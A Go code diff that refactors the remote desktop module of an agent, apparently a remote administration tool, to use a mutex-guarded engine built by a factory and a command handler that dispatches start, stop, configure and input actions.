@@ -127,7 +127,7 @@ type moduleManager struct {
 func newDefaultModuleManager() *moduleManager {
 	registry := newModuleManager()
 	registry.register(&appVncModule{})
-	registry.register(&remoteDesktopModule{})
+	registry.register(newRemoteDesktopModule())
 	registry.register(&audioModule{})
 	registry.register(&clipboardModule{})
 	registry.register(&fileManagerModule{})
@@ -327,8 +327,17 @@ func (a *Agent) moduleRuntime() ModuleRuntime {
 	}
 }
 
+type remoteDesktopEngineFactory func(context.Context, ModuleRuntime, remotedesktop.Config) (remotedesktop.Engine, error)
+
 type remoteDesktopModule struct {
-	streamer *remotedesktop.RemoteDesktopStreamer
+	mu           sync.Mutex
+	engine       remotedesktop.Engine
+	engineConfig remotedesktop.Config
+	factory      remoteDesktopEngineFactory
+}
+
+func newRemoteDesktopModule() *remoteDesktopModule {
+	return &remoteDesktopModule{factory: defaultRemoteDesktopEngineFactory}
 }
 
 func (m *remoteDesktopModule) Metadata() ModuleMetadata {
@@ -350,15 +359,15 @@ func (m *remoteDesktopModule) Metadata() ModuleMetadata {
 	}
 }
 
-func (m *remoteDesktopModule) Init(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *remoteDesktopModule) Init(ctx context.Context, runtime ModuleRuntime) error {
+	return m.configure(ctx, runtime)
 }
 
-func (m *remoteDesktopModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
-	return m.configure(runtime)
+func (m *remoteDesktopModule) UpdateConfig(ctx context.Context, runtime ModuleRuntime) error {
+	return m.configure(ctx, runtime)
 }
 
-func (m *remoteDesktopModule) configure(runtime ModuleRuntime) error {
+func (m *remoteDesktopModule) configure(ctx context.Context, runtime ModuleRuntime) error {
 	var requestTimeout time.Duration
 	if runtime.HTTPClient != nil {
 		requestTimeout = runtime.HTTPClient.Timeout
@@ -397,16 +406,32 @@ func (m *remoteDesktopModule) configure(runtime ModuleRuntime) error {
 	cfg.QUICInput.RootCAPEMs = append(cfg.QUICInput.RootCAPEMs, envList("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_PEMS")...)
 	cfg.QUICInput.PinnedSPKIHashes = append(cfg.QUICInput.PinnedSPKIHashes, envList("TENVY_REMOTE_DESKTOP_QUIC_SPKI_HASHES")...)
 	cfg.QUICInput.PinnedSPKIHashes = append(cfg.QUICInput.PinnedSPKIHashes, envList("TENVY_REMOTE_DESKTOP_QUIC_PINNED_SPKI_HASHES")...)
-	if m.streamer == nil {
-		m.streamer = remotedesktop.NewRemoteDesktopStreamer(cfg)
+	m.mu.Lock()
+	m.engineConfig = cfg
+	factory := m.factory
+	engine := m.engine
+	m.mu.Unlock()
+
+	if engine == nil {
+		if factory == nil {
+			factory = defaultRemoteDesktopEngineFactory
+		}
+		created, err := factory(ctx, runtime, cfg)
+		if err != nil {
+			return err
+		}
+		m.mu.Lock()
+		m.engine = created
+		m.mu.Unlock()
 		return nil
 	}
-	m.streamer.UpdateConfig(cfg)
-	return nil
+
+	return engine.Configure(cfg)
 }
 
 func (m *remoteDesktopModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
-	if m.streamer == nil {
+	engine := m.currentEngine()
+	if engine == nil {
 		return protocol.CommandResult{
 			CommandID:   cmd.ID,
 			Success:     false,
@@ -414,11 +439,47 @@ func (m *remoteDesktopModule) Handle(ctx context.Context, cmd protocol.Command) 
 			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
 		}
 	}
-	return m.streamer.HandleCommand(ctx, cmd)
+	payload, err := remotedesktop.DecodeCommandPayload(cmd.Payload)
+	if err != nil {
+		return protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       err.Error(),
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		}
+	}
+
+	var actionErr error
+	switch strings.ToLower(strings.TrimSpace(payload.Action)) {
+	case "start":
+		actionErr = engine.StartSession(ctx, payload)
+	case "stop":
+		actionErr = engine.StopSession(payload.SessionID)
+	case "configure":
+		actionErr = engine.UpdateSession(payload)
+	case "input":
+		actionErr = engine.HandleInput(ctx, payload)
+	default:
+		actionErr = fmt.Errorf("unsupported remote desktop action: %s", payload.Action)
+	}
+
+	result := protocol.CommandResult{
+		CommandID:   cmd.ID,
+		CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+	}
+	if actionErr != nil {
+		result.Success = false
+		result.Error = actionErr.Error()
+	} else {
+		result.Success = true
+		result.Output = fmt.Sprintf("remote desktop %s action processed", payload.Action)
+	}
+	return result
 }
 
 func (m *remoteDesktopModule) HandleInputBurst(ctx context.Context, burst protocol.RemoteDesktopInputBurst) error {
-	if m.streamer == nil {
+	engine := m.currentEngine()
+	if engine == nil {
 		return errors.New("remote desktop subsystem not initialized")
 	}
 	if len(burst.Events) == 0 {
@@ -457,13 +518,24 @@ func (m *remoteDesktopModule) HandleInputBurst(ctx context.Context, burst protoc
 		Events:    events,
 	}
 
-	return m.streamer.HandleInputPayload(ctx, payload)
+	return engine.HandleInput(ctx, payload)
 }
 
 func (m *remoteDesktopModule) Shutdown(context.Context) {
-	if m.streamer != nil {
-		m.streamer.Shutdown()
+	engine := m.currentEngine()
+	if engine != nil {
+		engine.Shutdown()
 	}
+}
+
+func (m *remoteDesktopModule) currentEngine() remotedesktop.Engine {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	return m.engine
+}
+
+func defaultRemoteDesktopEngineFactory(_ context.Context, _ ModuleRuntime, cfg remotedesktop.Config) (remotedesktop.Engine, error) {
+	return remotedesktop.NewRemoteDesktopStreamer(cfg), nil
 }
 
 type audioModule struct {
